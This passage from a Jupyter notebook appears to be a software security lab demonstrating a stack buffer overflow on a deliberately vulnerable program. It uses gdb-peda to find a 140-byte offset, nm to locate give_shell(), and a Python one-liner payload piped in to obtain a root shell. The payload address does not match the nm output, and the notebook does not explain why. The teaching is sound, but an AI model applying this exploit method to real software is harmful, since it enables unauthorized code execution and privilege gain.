    "0008| 0xffffbe18 (\"ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0012| 0xffffbe1c (\"TAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0016| 0xffffbe20 (\"AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0020| 0xffffbe24 (\"ArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0024| 0xffffbe28 (\"VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0028| 0xffffbe2c (\"AAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "[------------------------------------------------------------------------------]\n",
    "Legend: code, data, rodata, value\n",
    "Stopped reason: SIGSEGV\n",
    "0x41416d41 in ?? ()\n",
    "\n",
    "```\n",
    "\n",
    "- let's search for the offset using pattern search in registers\n",
    "- look for EIP+0 line for the offset of return address from the buffer\n",
    "\n",
    "\n",
    "```bash\n",
    "gdb-peda$ patts\n",
    "\n",
    "Registers contain pattern buffer:\n",
    "EBX+0 found at offset: 128\n",
    "EBP+0 found at offset: 136\n",
    "ESI+0 found at offset: 132\n",
    "EIP+0 found at offset: 140 <<<<<<<----------- THE OFFSET WE NEED TO OVERFLOW RETURN ADDRESS !!!!!\n",
    "Registers point to pattern buffer:\n",
    "[ESP] --> offset 144 - size ~56\n",
    "Pattern buffer found at:\n",
    "0x08051bbe : offset    0 - size  200 ([heap])\n",
    "0x08051fc0 : offset    0 - size  200 ([heap])\n",
    "0xf7fa70b9 : offset 33208 - size    4 (/usr/lib32/libm.so.6)\n",
    "0xffffbd80 : offset    0 - size  200 ($sp + -0x90 [-36 dwords])\n",
    "References to pattern buffer found at:\n",
    "0xf7a1d624 : 0x08051fc0 (/usr/lib32/libc.so.6)\n",
    "0xf7a1d628 : 0x08051fc0 (/usr/lib32/libc.so.6)\n",
    "0xf7a1d62c : 0x08051fc0 (/usr/lib32/libc.so.6)\n",
    "0xf7a1d630 : 0x08051fc0 (/usr/lib32/libc.so.6)\n",
    "0xf7a1d634 : 0x08051fc0 (/usr/lib32/libc.so.6)\n",
    "0xf7a1d638 : 0x08051fc0 (/usr/lib32/libc.so.6)\n",
    "0xf7a1d63c : 0x08051fc0 (/usr/lib32/libc.so.6)\n",
    "0xf7c8b1d5 : 0xffffbd80 (/usr/lib32/libstdc++.so.6.0.30)\n",
    "0xffffb8b8 : 0xffffbd80 ($sp + -0x558 [-342 dwords])\n",
    "```\n",
    "\n",
    "- so, the caller's return address is **140** bytes away from the buffer\n",
    "\n",
    "#### step 2: find the address of give_shell()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "080491d6 T _Z10give_shellv\r\n"
     ]
    }
   ],
   "source": [
    "! nm so_stdio.exe | grep give_shell"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- look for a line that has *give_shell*\n",
    "- the first column is the address of the symbols when the program is loaded in memory for execution\n",
    "- now let's create the payload of 140 JUNK + [little endian address of give_shell] and send it to the program as shown below\n",
    "- caveat: since the program takes data from STD IO, we need to create and store the payload into a file\n",
    "- then cat and pipe the contents of the payload; \n",
    "- NOTE `-` hyphen after cat is required to get the interactive shell\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/stack_overflow]\n",
    "└─$ python -c 'import sys; sys.stdout.buffer.write(b\"A\"*140 + b\"\\x12\\x92\\x04\\x08\")' > payload.bin\n",
    "\n",
    "┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/stack_overflow]\n",
    "└─$ cat payload.bin - | ./so_stdio.exe\n",
    "buffer is at 0xffffbdd0\n",
    "Give me some text: hello\n",
    "Acknowledged: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhello with length 149\n",
    "whoami\n",
    "root\n",
    "date\n",
    "Mon Mar 27 02:16:06 PM EDT 2023\n",
    "exit\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
